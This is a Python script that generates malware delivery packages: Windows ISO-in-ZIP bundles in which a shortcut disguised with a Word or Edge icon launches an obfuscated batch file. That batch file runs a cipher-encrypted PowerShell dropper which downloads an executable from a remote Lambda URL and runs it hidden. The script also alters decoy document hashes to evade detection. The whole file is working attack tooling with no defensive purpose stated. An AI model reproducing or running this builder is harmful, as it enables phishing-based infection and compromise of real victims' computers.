#!/usr/bin/env python3
"""
exam-gen: Automated kill chain generator for Linux.
Produces unique Word (.zip) and PDF (.zip) packages per variant folder.

Config via environment variables (or .env file next to this script):
  LAMBDA_URL       — Lambda Function URL for payload delivery
  API_KEY          — X-Api-Key header value
  TARGET_FILENAME  — Downloaded file name on victim (default: cat.exe)
  VARIANTS_DIR     — Path to variant folders (default: ./variants)
  OUTPUT_DIR       — Path for output ZIPs     (default: ./output)
"""

import base64
import io
import os
import random
import shutil
import string
import struct
import subprocess
import sys
import tempfile
import zipfile

from docx import Document
from docx.shared import Pt, RGBColor

import pycdlib

# ── Try pylnk3, fall back to manual binary builder ──────────────────
try:
    import pylnk3
    HAS_PYLNK3 = True
except ImportError:
    HAS_PYLNK3 = False

# ====================================================================
#  CONFIG — loaded from env / .env file
# ====================================================================

def _load_dotenv():
    """Load .env file from script directory (simple key=value, no shell expansion)."""
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env')
    if not os.path.isfile(env_path):
        return
    with open(env_path, encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '=' not in line:
                continue
            key, _, value = line.partition('=')
            key = key.strip()
            value = value.strip().strip("'").strip('"')
            os.environ.setdefault(key, value)

_load_dotenv()

LAMBDA_URL      = os.environ.get('LAMBDA_URL', '')
API_KEY         = os.environ.get('API_KEY', '')
TARGET_FILENAME = os.environ.get('TARGET_FILENAME', 'cat.exe')
VARIANTS_DIR    = os.environ.get('VARIANTS_DIR', './variants')
OUTPUT_DIR      = os.environ.get('OUTPUT_DIR', './output')

# ====================================================================
#  CONSTANTS
# ====================================================================

CIPHER_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -"!@_.$()[]{}:;/,=#+'
CIPHER_CODE_CHARS = list(string.digits + string.ascii_lowercase)  # 0-9 a-z

WORD_POOL = [
    # Windows API / Kernel style
    'NtQueryObj', 'ZwAllocMem', 'RtlInitStr', 'LdrLoadDll', 'CsrClient',
    'KiDispatch', 'ObRefByHnd', 'PsGetProc', 'MmMapView', 'IoCallDrv',
    'SeAccessChk', 'CmQueryKey', 'ExAllocPool', 'KeWaitObj', 'HalDispTbl',
    'NtOpenProc', 'ZwWriteMem', 'RtlCopyMem', 'LdrGetProc', 'CsrCapture',
    'KiUserApc', 'ObDerefObj', 'PsLookup', 'MmSecure', 'IoAllocIrp',
    # Hex-junk style
    'x4f2a', 'b7e9c', 'd3f1a', 'a8c4e', 'f0b2d', 'e6a9f',
    'c1d7b', 'x9e3f', 'b2a6c', 'd8f4e', 'a0c7b', 'f3e1d',
    'x7b5a', 'c9d2f', 'e4a8b', 'b1f6c', 'd5e0a', 'a3c9f',
    'x2d8b', 'f7a1c', 'c4e6d', 'b9f3a', 'd0a5e', 'e1c8f',
    'x6f4b', 'a5d9c', 'f2b7e', 'c8e3a', 'd7a0f', 'b4c1d',
]

NATO_WORDS = [
    'alpha', 'bravo', 'charlie', 'delta', 'echo', 'foxtrot',
    'golf', 'hotel', 'india', 'juliet', 'kilo', 'lima', 'mike',
    'november', 'oscar', 'papa', 'quebec', 'romeo', 'sierra',
    'tango', 'uniform', 'victor', 'whiskey', 'xray', 'yankee', 'zulu',
    'sync', 'node', 'data', 'core', 'init', 'load', 'proc', 'task',
]

REM_POOL = [
    'REM System diagnostic module v{v}',
    'REM Checking system integrity...',
    'REM Initializing update service...',
    'REM Configuration loader v{v1}',
    'REM Verifying digital signatures...',
    'REM Module sync in progress...',
    'REM Runtime environment check...',
    'REM Service heartbeat monitor',
]


# ====================================================================
#  HELPER: random variable name (port of Get-RandomVarName)
# ====================================================================

def random_var_name():
    w1 = random.choice(WORD_POOL)
    w2 = random.choice(WORD_POOL)
    num = random.randint(10, 99)
    return f'{w1}{w2}{num}'


def random_short_name():
    """Generate a random 2-3 letter filename (lowercase)."""
    length = random.randint(2, 3)
    return ''.join(random.choices(string.ascii_lowercase, k=length))


# ====================================================================
#  CIPHER MAP (port of sk.ps1 cipher generation)
# ====================================================================

def generate_cipher_map():
    """Return (encrypt_map, decrypt_map) — each char -> unique 2-char code."""
    encrypt_map = {}
    decrypt_map = {}
    for ch in CIPHER_ALPHABET:
        while True:
            code = random.choice(CIPHER_CODE_CHARS) + random.choice(CIPHER_CODE_CHARS)
            if code not in decrypt_map:
                break
        encrypt_map[ch] = code
        decrypt_map[code] = ch
    return encrypt_map, decrypt_map


def encrypt_string(text, encrypt_map):
    result = []
    for ch in text:
        if ch in encrypt_map:
            result.append(encrypt_map[ch])
        else:
            result.append(ch)
    return ''.join(result)


# ====================================================================
#  PS1 DROPPER GENERATOR
# ====================================================================

def generate_ps1(encrypt_map, decrypt_map):
    """Build the full PS1 artifact (dropper with cipher wrapper)."""

    # ── random placeholder tags (unique per variant) ──
    tag_url = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'
    tag_fn = '##' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))) + '##'

    # ── random variable names for the inner template ──
    dv1 = random_var_name()  # tempPath
    dv2 = random_var_name()  # webClient
    dv3 = random_var_name()  # url
    dv4 = random_var_name()  # filename
    dv5 = random_var_name()  # fullPath

    # 9-line dropper template (WebClient + X-Api-Key for Lambda)
    script_template = (
        f'[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12\n'
        f'${dv1} = [system.io.path]::gettemppath()\n'
        f'${dv2} = new-object system.net.webclient\n'
        f'${dv2}.headers.add("x-api-key", "{API_KEY}")\n'
        f'${dv3} = "{tag_url}"\n'
        f'${dv4} = "{tag_fn}"\n'
        f'${dv5} = join-path ${dv1} ${dv4}\n'
        f'${dv2}.downloadfile(${dv3}, ${dv5})\n'
        f'start-process -filepath ${dv5} -windowstyle hidden'
    )

    # ── encode URL & filename as Base64 ──
    b64_url = base64.b64encode(LAMBDA_URL.encode('utf-8')).decode('ascii')
    b64_filename = base64.b64encode(TARGET_FILENAME.encode('utf-8')).decode('ascii')

    # ── encrypt the template body ──
    encrypted_body = encrypt_string(script_template, encrypt_map)

    # ── random variable names for the wrapper ──
    var_url = random_var_name()
    var_filename = random_var_name()
    var_enc_body = random_var_name()
    var_dec_map = random_var_name()
    var_func = random_var_name()
    var_decoded_url = random_var_name()
    var_decoded_fn = random_var_name()
    var_dec_script = random_var_name()
    var_final = random_var_name()

    # ── build the decryption map block ──
    # { and } go to end to avoid @{} block breakage
    normal_entries = []
    special_entries = []
    for code, ch in decrypt_map.items():
        entry = f"'{code}'='{ch}'"
        if ch in '{}':
            special_entries.append(entry)
        else:
            normal_entries.append(entry)
    all_entries = normal_entries + special_entries

    map_lines = []
    for i in range(0, len(all_entries), 10):
        chunk = all_entries[i:i + 10]
        map_lines.append('    ' + '; '.join(chunk) + '; ')
    map_block = '\n'.join(map_lines)

    # ── assemble final artifact ──
    artifact = (
        f"${var_url} = '{b64_url}'\n"
        f"${var_filename} = '{b64_filename}'\n"
        f"${var_enc_body} = '{encrypted_body}'\n"
        f"\n"
        f"${var_dec_map} = @{{\n"
        f"{map_block}\n"
        f"}}\n"
        f"\n"
        f"function {var_func} {{\n"
        f"    param ([string]$InputString)\n"
        f"    $result = \"\"\n"
        f"    $i = 0\n"
        f"    while ($i -lt $InputString.Length) {{\n"
        f"        if ($i + 1 -lt $InputString.Length) {{\n"
        f"            $pair = $InputString.Substring($i, 2)\n"
        f"            if (${var_dec_map}.ContainsKey($pair)) {{\n"
        f"                $result += ${var_dec_map}[$pair]\n"
        f"                $i += 2\n"
        f"                continue\n"
        f"            }}\n"
        f"        }}\n"
        f"        $result += $InputString[$i]\n"
        f"        $i++\n"
        f"    }}\n"
        f"    return $result\n"
        f"}}\n"
        f"\n"
        f"${var_decoded_url} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_url}))\n"
        f"${var_decoded_fn} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${var_filename}))\n"
        f"${var_dec_script} = {var_func} -InputString ${var_enc_body}\n"
        f"${var_final} = ${var_dec_script} -replace '{tag_url}', ${var_decoded_url}\n"
        f"${var_final} = ${var_final} -replace '{tag_fn}', ${var_decoded_fn}\n"
        f"Invoke-Expression ${var_final}\n"
    )
    return artifact


# ====================================================================
#  DOCX HASH MODIFICATION
# ====================================================================

def rehash_docx(docx_path):
    """Add invisible white 1pt random text to change the file hash."""
    doc = Document(docx_path)
    count = random.randint(6, 15)
    words = ' '.join(random.choices(NATO_WORDS, k=count))
    para = doc.add_paragraph()
    run = para.add_run(words)
    run.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
    run.font.size = Pt(1)
    doc.save(docx_path)


# ====================================================================
#  BAT OBFUSCATION (set-variable fragmentation)
# ====================================================================

def _junk_rems():
    pool = []
    for template in REM_POOL:
        line = template.format(
            v=f'{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,9)}',
            v1=str(random.randint(1, 5)),
        )
        pool.append(line)
    random.shuffle(pool)
    return pool[:random.randint(3, 5)]


def generate_bat(decoy_name, ps1_name='ser.ps1'):
    """Build obfuscated BAT content."""
    ps_fragments = [('pow', 'a'), ('ersh', 'b'), ('ell', 'c')]
    arg_fragments = [
        ('-NoP', 'd'), ('rofile', 'e'),
        (' -Ex', 'f'), ('ecutionP', 'g'), ('olicy Bypass', 'h'),
        (' -Wi', 'i'), ('ndowStyle Hidden', 'j'),
    ]
    all_frags = ps_fragments + arg_fragments
    set_lines = [f'set "{var}={val}"' for val, var in all_frags]
    random.shuffle(set_lines)

    bat_lines = ['@echo off', 'cd /d "%~dp0"']
    rems = _junk_rems()
    rem_i = 0
    for sl in set_lines:
        if rem_i < len(rems) and random.random() > 0.4:
            bat_lines.append(rems[rem_i])
            rem_i += 1
        bat_lines.append(sl)
    while rem_i < len(rems):
        bat_lines.append(rems[rem_i])
        rem_i += 1

    ps_exe = '%' + '%%'.join(v for _, v in ps_fragments) + '%'
    ps_args = '%' + '%%'.join(v for _, v in arg_fragments) + '%'
    bat_lines.append('')
    bat_lines.append(f'start {decoy_name}')
    bat_lines.append(f'{ps_exe}.exe {ps_args} -File {ps1_name}')
    return '\r\n'.join(bat_lines) + '\r\n'


# ====================================================================
#  LNK CREATION (pylnk3 or raw binary)
# ====================================================================

def _build_lnk_binary(target, arguments, icon_location, icon_index, working_dir, window_style):
    """Build a minimal .lnk (Shell Link Binary) file manually.
    Follows [MS-SHLLINK] specification.
    """
    buf = io.BytesIO()

    # ── ShellLinkHeader (76 bytes) ──
    header_size = 0x0000004C
    clsid = b'\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46'

    # LinkFlags: HasLinkTargetIDList | HasLinkInfo | HasRelativePath |
    #            HasWorkingDir | HasArguments | HasIconLocation | IsUnicode
    link_flags = (
        0x00000001 |  # HasLinkTargetIDList
        0x00000002 |  # HasLinkInfo
        0x00000008 |  # HasRelativePath
        0x00000010 |  # HasWorkingDir
        0x00000020 |  # HasArguments
        0x00000040 |  # HasIconLocation
        0x00000080    # IsUnicode
    )
    file_attributes = 0x00000020  # FILE_ATTRIBUTE_ARCHIVE
    creation_time = 0
    access_time = 0
    write_time = 0
    file_size = 0
    show_command = window_style  # SW_SHOWMINNOACTIVE = 7
    hot_key = 0
    reserved1 = 0
    reserved2 = 0
    reserved3 = 0

    buf.write(struct.pack('<I', header_size))
    buf.write(clsid)
    buf.write(struct.pack('<I', link_flags))
    buf.write(struct.pack('<I', file_attributes))
    buf.write(struct.pack('<Q', creation_time))
    buf.write(struct.pack('<Q', access_time))
    buf.write(struct.pack('<Q', write_time))
    buf.write(struct.pack('<I', file_size))
    buf.write(struct.pack('<I', icon_index))
    buf.write(struct.pack('<I', show_command))
    buf.write(struct.pack('<H', hot_key))
    buf.write(struct.pack('<H', reserved1))
    buf.write(struct.pack('<I', reserved2))
    buf.write(struct.pack('<I', reserved3))

    # ── LinkTargetIDList ──
    # Build a minimal IDList pointing to cmd.exe via CLSID for "My Computer"
    # Simpler approach: just build a basic item ID for the target
    def _make_simple_pidl(path_str):
        """Create a minimal IDList with a single file-reference item."""
        # Item: type=0x32 (file), short name
        short_name = os.path.basename(path_str).encode('ascii') + b'\x00'
        # ItemID: size(2) + type(1) + unknown(1) + filesize(4) + moddate(4) +
        #         modtime(2) + attrs(2) + shortname + padding + unicode_name
        item_data = b'\x00' * 1  # sort index
        item_data += b'\x32'     # type: file
        item_data += b'\x00' * 10  # file size + dates
        short_padded = short_name
        if len(short_padded) % 2 == 0:
            short_padded += b'\x00'
        item_data += short_padded
        item_size = 2 + len(item_data)
        item = struct.pack('<H', item_size) + item_data

        # CLSID for My Computer: 20D04FE0-3AEA-1069-A2D8-08002B30309D
        clsid_item_data = b'\x1f\x50'  # type: GUID
        clsid_item_data += bytes([
            0xe0, 0x4f, 0xd0, 0x20, 0xea, 0x3a, 0x69, 0x10,
            0xa2, 0xd8, 0x08, 0x00, 0x2b, 0x30, 0x30, 0x9d
        ])
        clsid_size = 2 + len(clsid_item_data)
        clsid_item = struct.pack('<H', clsid_size) + clsid_item_data

        # Drive item for C:
        drive_data = b'/'  # type: drive
        drive_data += b'C:\\\x00'
        drive_size = 2 + len(drive_data)
        drive_item = struct.pack('<H', drive_size) + drive_data

        # Combine: CLSID_item + drive_item + file_item + terminator
        id_list = clsid_item + drive_item + item + struct.pack('<H', 0)
        return struct.pack('<H', len(id_list)) + id_list

    pidl = _make_simple_pidl(target)
    buf.write(pidl)

    # ── LinkInfo ──
    # Minimal LinkInfo pointing to a local volume
    target_bytes = target.encode('ascii') + b'\x00'
    link_info_hdr_size = 28
    vol_id_offset = 28
    local_base_offset_pos = 16

    # VolumeID: minimal
    vol_id_data = b'\x00\x00\x00\x00'  # drive type
    vol_id_data += b'\x00\x00\x00\x00'  # serial
    vol_id_data += b'\x00\x00\x00\x00'  # label offset
    vol_id_label = b'\x00'
    vol_id_body = struct.pack('<I', 16 + len(vol_id_label)) + vol_id_data + vol_id_label
    vol_id_size = len(vol_id_body)

    local_base_path_offset = vol_id_offset + vol_id_size
    common_suffix_offset = local_base_path_offset + len(target_bytes)

    link_info_size = common_suffix_offset + 1  # +1 for null terminator
    link_info_flags = 0x00000001  # VolumeIDAndLocalBasePath

    li = io.BytesIO()
    li.write(struct.pack('<I', link_info_size))
    li.write(struct.pack('<I', link_info_hdr_size))
    li.write(struct.pack('<I', link_info_flags))
    li.write(struct.pack('<I', vol_id_offset))
    li.write(struct.pack('<I', local_base_path_offset))
    li.write(struct.pack('<I', 0))  # CommonNetworkRelativeLinkOffset
    li.write(struct.pack('<I', common_suffix_offset))
    li.write(vol_id_body)
    li.write(target_bytes)
    li.write(b'\x00')  # common path suffix
    buf.write(li.getvalue())

    # ── StringData (Unicode) ──
    def _write_string_data(s):
        encoded = s.encode('utf-16-le')
        count = len(s)
        buf.write(struct.pack('<H', count))
        buf.write(encoded)

    # RelativePath
    _write_string_data('.\\' + os.path.basename(target))
    # WorkingDir
    _write_string_data(working_dir)
    # Arguments
    _write_string_data(arguments)
    # IconLocation
    _write_string_data(icon_location)

    return buf.getvalue()


def create_lnk(out_path, target, arguments, icon_location, icon_index, working_dir='.', window_style=7):
    """Create a Windows .lnk shortcut file."""
    if HAS_PYLNK3:
        # pylnk3.for_file() handles IDList / LinkInfo internals automatically
        lnk = pylnk3.for_file(
            target_file=target,
            lnk_name=out_path,
            arguments=arguments,
            icon_file=icon_location,
            icon_index=icon_index,
            work_dir=working_dir,
            window_mode='Minimized',  # maps to ShowCommand=7 (SW_SHOWMINNOACTIVE)
        )
    else:
        data = _build_lnk_binary(target, arguments, icon_location, icon_index, working_dir, window_style)
        with open(out_path, 'wb') as f:
            f.write(data)


# ====================================================================
#  ISO CREATION (pycdlib with Joliet + hidden flags)
# ====================================================================

def build_iso(iso_path, files, hidden_names):
    """Pack files into a Joliet ISO with hidden flags on specified names.

    files: list of (filename, local_path) tuples
    hidden_names: set of filenames that should be hidden in ISO9660 records
    """
    iso = pycdlib.PyCdlib()
    iso.new(joliet=3, vol_ident='DATA')

    _iso_name_registry.clear()
    added = []  # track (iso9660_path, joliet_path, filename) for hidden pass

    for filename, local_path in files:
        iso_name = _iso9660_name(filename)
        iso9660_path = '/' + iso_name + ';1'
        joliet_path = '/' + filename

        with open(local_path, 'rb') as f:
            data = f.read()

        iso.add_fp(
            fp=io.BytesIO(data),
            length=len(data),
            iso_path=iso9660_path,
            joliet_path=joliet_path,
        )
        added.append((iso9660_path, joliet_path, filename))

    # Set hidden flags after all files are added (public API)
    for iso9660_path, joliet_path, filename in added:
        if filename in hidden_names:
            iso.set_hidden(iso_path=iso9660_path)
            iso.set_hidden(joliet_path=joliet_path)

    iso.write(iso_path)
    iso.close()


_iso_name_registry = set()


def _iso9660_name(filename):
    """Convert a filename to a valid ISO9660 Level 1 name (unique within a session)."""
    name, ext = os.path.splitext(filename)
    clean = ''.join(c for c in name.upper() if c in string.ascii_uppercase + string.digits + '_')
    if not clean:
        clean = 'FILE'
    clean_ext = ''.join(c for c in ext.upper().lstrip('.') if c in string.ascii_uppercase + string.digits + '_')

    if clean_ext:
        base = clean[:8] + '.' + clean_ext[:3]
    else:
        base = clean[:8]

    # Ensure uniqueness within the current ISO
    candidate = base
    counter = 1
    while candidate in _iso_name_registry:
        suffix = str(counter)
        if clean_ext:
            candidate = clean[:8 - len(suffix)] + suffix + '.' + clean_ext[:3]
        else:
            candidate = clean[:8 - len(suffix)] + suffix
        counter += 1
    _iso_name_registry.add(candidate)
    return candidate


# ====================================================================
#  DOCX -> PDF CONVERSION
# ====================================================================

def convert_docx_to_pdf(docx_path, output_dir):
    """Convert a DOCX to PDF. Uses Word on Windows, LibreOffice on Linux."""
    if sys.platform == 'win32':
        from docx2pdf import convert
        basename = os.path.splitext(os.path.basename(docx_path))[0]
        pdf_path = os.path.join(output_dir, basename + '.pdf')
        convert(docx_path, pdf_path)
        return pdf_path
    else:
        lo_bin = shutil.which('libreoffice') or shutil.which('soffice')
        if not lo_bin:
            print('[!] LibreOffice not found: sudo apt install libreoffice-writer')
            sys.exit(1)
        subprocess.run(
            [lo_bin, '--headless', '--convert-to', 'pdf', '--outdir', output_dir, docx_path],
            check=True, capture_output=True,
        )
        basename = os.path.splitext(os.path.basename(docx_path))[0]
        return os.path.join(output_dir, basename + '.pdf')


# ====================================================================
#  MAIN PIPELINE
# ====================================================================

def process_variant(variant_dir, output_dir):
    """Process a single variant folder -> Word .zip + PDF .zip."""
    variant_name = os.path.basename(variant_dir)
    print(f'\n{"="*60}')
    print(f'  Processing: {variant_name}')
    print(f'{"="*60}')

    # Collect DOCX files (sorted for deterministic first-file selection)
    docx_files = sorted(f for f in os.listdir(variant_dir) if f.lower().endswith('.docx'))
    if not docx_files:
        print(f'  [!] No .docx files in {variant_dir}, skipping.')
        return

    first_docx = docx_files[0]
    other_docx = docx_files[1:]

    # ── Step 1: Copy to temp & rehash ──
    print('  [*] Step 1: Copy & rehash DOCX files...')
    tmpdir = tempfile.mkdtemp(prefix=f'exam-gen-{variant_name}-')
    try:
        for f in docx_files:
            src = os.path.join(variant_dir, f)
            dst = os.path.join(tmpdir, f)
            shutil.copy2(src, dst)
            rehash_docx(dst)
            print(f'      ~ {f} (hash updated)')

        # ── Step 2: Build Word package (own cipher + names) ──
        print('  [*] Step 2: Build Word package...')
        w_bat = random_short_name() + '.bat'
        w_ps1 = random_short_name() + '.ps1'
        w_decoy = random_short_name() + '.docx'
        w_enc, w_dec = generate_cipher_map()
        w_ps1_content = generate_ps1(w_enc, w_dec)
        print(f'      [word] bat={w_bat}, ps1={w_ps1}, decoy={w_decoy}')

        word_pkg_dir = os.path.join(tmpdir, '_word_pkg')
        os.makedirs(word_pkg_dir)

        # Rename first DOCX -> random decoy name (hidden)
        shutil.copy2(os.path.join(tmpdir, first_docx), os.path.join(word_pkg_dir, w_decoy))
        # Copy other DOCX files as-is (visible)
        for f in other_docx:
            shutil.copy2(os.path.join(tmpdir, f), os.path.join(word_pkg_dir, f))

        # Generate BAT
        bat_content = generate_bat(w_decoy, w_ps1)
        bat_path = os.path.join(word_pkg_dir, w_bat)
        with open(bat_path, 'w', encoding='utf-8') as f:
            f.write(bat_content)

        # Write PS1
        ps1_path = os.path.join(word_pkg_dir, w_ps1)
        with open(ps1_path, 'w', encoding='utf-8') as f:
            f.write(w_ps1_content)

        # Create LNK (Word icon)
        lnk_name = os.path.splitext(first_docx)[0] + '.lnk'
        lnk_path = os.path.join(word_pkg_dir, lnk_name)
        create_lnk(
            out_path=lnk_path,
            target='C:\\Windows\\System32\\cmd.exe',
            arguments=f'/c "start /min .\\{w_bat}"',
            icon_location='%SystemRoot%\\System32\\SHELL32.dll',
            icon_index=1,
            working_dir='.',
            window_style=7,
        )
        print(f'      LNK: {lnk_name} (Word icon)')

        # Build ISO
        iso_files = []
        hidden_set = {w_bat, w_ps1, w_decoy}
        iso_files.append((w_bat, bat_path))
        iso_files.append((w_ps1, ps1_path))
        iso_files.append((w_decoy, os.path.join(word_pkg_dir, w_decoy)))
        iso_files.append((lnk_name, lnk_path))
        for f in other_docx:
            iso_files.append((f, os.path.join(word_pkg_dir, f)))

        word_iso_path = os.path.join(tmpdir, f'{variant_name}.iso')
        build_iso(word_iso_path, iso_files, hidden_set)
        print(f'      ISO built: {variant_name}.iso')

        # Pack ISO -> ZIP
        word_zip_path = os.path.join(output_dir, f'{variant_name}.zip')
        with zipfile.ZipFile(word_zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(word_iso_path, f'{variant_name}.iso')
        print(f'      ZIP: {word_zip_path}')

        # ── Step 3: Build PDF package (own cipher + names) ──
        print('  [*] Step 3: Build PDF package...')
        p_bat = random_short_name() + '.bat'
        p_ps1 = random_short_name() + '.ps1'
        p_decoy = random_short_name() + '.pdf'
        p_enc, p_dec = generate_cipher_map()
        p_ps1_content = generate_ps1(p_enc, p_dec)
        print(f'      [pdf]  bat={p_bat}, ps1={p_ps1}, decoy={p_decoy}')

        pdf_pkg_dir = os.path.join(tmpdir, '_pdf_pkg')
        os.makedirs(pdf_pkg_dir)

        # Convert all DOCX -> PDF
        pdf_convert_dir = os.path.join(tmpdir, '_pdf_convert')
        os.makedirs(pdf_convert_dir)
        pdf_map = {}  # original docx name -> pdf filename
        for f in docx_files:
            src_docx = os.path.join(tmpdir, f)
            pdf_path = convert_docx_to_pdf(src_docx, pdf_convert_dir)
            pdf_name = os.path.basename(pdf_path)
            pdf_map[f] = pdf_name
            print(f'      Converted: {f} -> {pdf_name}')

        first_pdf = pdf_map[first_docx]
        other_pdfs = [pdf_map[f] for f in other_docx]

        # Rename first PDF -> random decoy name (hidden)
        shutil.copy2(os.path.join(pdf_convert_dir, first_pdf), os.path.join(pdf_pkg_dir, p_decoy))
        # Copy other PDFs as-is (visible)
        for f in other_pdfs:
            shutil.copy2(os.path.join(pdf_convert_dir, f), os.path.join(pdf_pkg_dir, f))

        # Generate BAT (opens decoy pdf)
        bat_content_pdf = generate_bat(p_decoy, p_ps1)
        bat_path_pdf = os.path.join(pdf_pkg_dir, p_bat)
        with open(bat_path_pdf, 'w', encoding='utf-8') as f:
            f.write(bat_content_pdf)

        # Write PS1 (own dropper)
        ps1_path_pdf = os.path.join(pdf_pkg_dir, p_ps1)
        with open(ps1_path_pdf, 'w', encoding='utf-8') as f:
            f.write(p_ps1_content)

        # Create LNK (Edge icon)
        lnk_name_pdf = os.path.splitext(first_docx)[0] + '.lnk'
        lnk_path_pdf = os.path.join(pdf_pkg_dir, lnk_name_pdf)
        create_lnk(
            out_path=lnk_path_pdf,
            target='C:\\Windows\\System32\\cmd.exe',
            arguments=f'/c "start /min .\\{p_bat}"',
            icon_location='%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe',
            icon_index=11,
            working_dir='.',
            window_style=7,
        )
        print(f'      LNK: {lnk_name_pdf} (Edge icon)')

        # Build ISO
        pdf_iso_files = []
        pdf_hidden_set = {p_bat, p_ps1, p_decoy}
        pdf_iso_files.append((p_bat, bat_path_pdf))
        pdf_iso_files.append((p_ps1, ps1_path_pdf))
        pdf_iso_files.append((p_decoy, os.path.join(pdf_pkg_dir, p_decoy)))
        pdf_iso_files.append((lnk_name_pdf, lnk_path_pdf))
        for f in other_pdfs:
            pdf_iso_files.append((f, os.path.join(pdf_pkg_dir, f)))

        pdf_iso_path = os.path.join(tmpdir, f'{variant_name}_pdf.iso')
        build_iso(pdf_iso_path, pdf_iso_files, pdf_hidden_set)
        print(f'      ISO built: {variant_name}_pdf.iso')

        # Pack ISO -> ZIP
        pdf_zip_path = os.path.join(output_dir, f'{variant_name}_pdf.zip')
        with zipfile.ZipFile(pdf_zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(pdf_iso_path, f'{variant_name}_pdf.iso')
        print(f'      ZIP: {pdf_zip_path}')

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

    print(f'  [+] {variant_name} done!')


def main():
    # Validate required config
    if not LAMBDA_URL:
        print('[!] LAMBDA_URL is not set. Export it or add to .env file.')
        sys.exit(1)
    if not API_KEY:
        print('[!] API_KEY is not set. Export it or add to .env file.')
        sys.exit(1)

    # Resolve paths relative to script location
    script_dir = os.path.dirname(os.path.abspath(__file__))
    variants_dir = os.path.join(script_dir, VARIANTS_DIR) if not os.path.isabs(VARIANTS_DIR) else VARIANTS_DIR
    output_dir = os.path.join(script_dir, OUTPUT_DIR) if not os.path.isabs(OUTPUT_DIR) else OUTPUT_DIR

    os.makedirs(output_dir, exist_ok=True)

    # Find variant folders
    if not os.path.isdir(variants_dir):
        print(f'[!] Variants directory not found: {variants_dir}')
        sys.exit(1)

    variant_dirs = sorted(
        os.path.join(variants_dir, d)
        for d in os.listdir(variants_dir)
        if os.path.isdir(os.path.join(variants_dir, d))
    )

    if not variant_dirs:
        print(f'[!] No variant folders found in {variants_dir}')
        sys.exit(1)

    print(f'[*] Found {len(variant_dirs)} variant(s) in {variants_dir}')
    print(f'[*] Output: {output_dir}')
    print(f'[*] Lambda URL: {LAMBDA_URL}')
    print(f'[*] Target filename: {TARGET_FILENAME}')

    for vd in variant_dirs:
        process_variant(vd, output_dir)

    print(f'\n{"="*60}')
    print(f'  ALL DONE — {len(variant_dirs)} variant(s) processed')
    print(f'{"="*60}\n')


if __name__ == '__main__':
    main()
